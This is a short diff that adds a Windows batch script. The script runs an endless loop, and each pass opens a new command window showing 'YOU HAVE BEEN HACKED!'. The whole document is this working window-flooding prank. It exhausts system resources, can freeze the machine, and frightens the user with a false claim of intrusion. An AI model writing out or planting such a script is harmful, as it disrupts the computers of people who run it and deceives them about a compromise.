@@ -1,0 +1,4 @@
+@echo off
+A:
+START CMD /C "ECHO YOU HAVE BEEN HACKED! && PAUSE"
+goto A
